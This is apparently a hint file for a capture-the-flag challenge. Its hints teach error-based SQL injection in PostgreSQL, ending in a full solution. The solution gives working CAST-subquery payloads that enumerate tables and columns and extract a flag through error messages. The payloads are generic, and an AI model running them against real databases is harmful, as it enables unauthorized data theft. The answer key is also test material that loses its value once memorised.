hints.title: Nudge
hints.content: PostgreSQL displays detailed error messages including the values that caused the error. Can you force an error that includes data you want to read?

hints.title: Direction
hints.content: PostgreSQL is strict about types. If you try to CAST a string as an integer, the error message includes the string value. This is your data exfiltration channel.

hints.title: Approach
hints.content: Try: 1 AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS INTEGER)-- The error will say 'invalid input syntax for integer: "table_name_here"'.

hints.title: Near-solution
hints.content: Find the admin_config table, then: 1 AND 1=CAST((SELECT config_value FROM admin_config LIMIT 1) AS INTEGER)-- The error message will contain the flag.

hints.title: Solution
hints.content: 1) Enumerate tables: ?id=1 AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1) AS INTEGER)-- reveals 'admin_config'. 2) Find columns: ?id=1 AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='admin_config' LIMIT 1 OFFSET 1) AS INTEGER)-- reveals 'config_value'. 3) Extract flag: ?id=1 AND 1=CAST((SELECT config_value FROM admin_config LIMIT 1) AS INTEGER)-- The error shows: invalid input syntax for type integer: "TYPHON{...}"
